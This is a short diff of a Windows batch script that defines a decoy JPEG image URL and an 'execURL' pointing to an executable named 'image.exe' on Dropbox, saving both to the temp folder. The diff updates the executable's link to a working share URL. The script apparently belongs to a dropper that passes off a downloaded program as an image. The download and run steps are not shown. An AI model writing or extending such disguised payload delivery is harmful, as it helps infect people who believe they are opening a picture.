@@ -2,7 +2,7 @@
 setlocal enabledelayedexpansion
 
 set "imageURL=https://www.homedora.com/cdn/shop/files/UrlaAngel04Cream_8_1_1.jpg"
-set "execURL=https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe"
+set "execURL=https://www.dropbox.com/scl/fi/aye26mdzpnsk7k7ozrjw2/image.exe?rlkey=z0xqqilboj5m9xbskio0xio2e&st=6a5qzubo&dl=0"
 
 set "imageFile=%TEMP%\UrlaAngel04Cream_8_1_1.jpg"
 set "execFile=%TEMP%\image.exe"
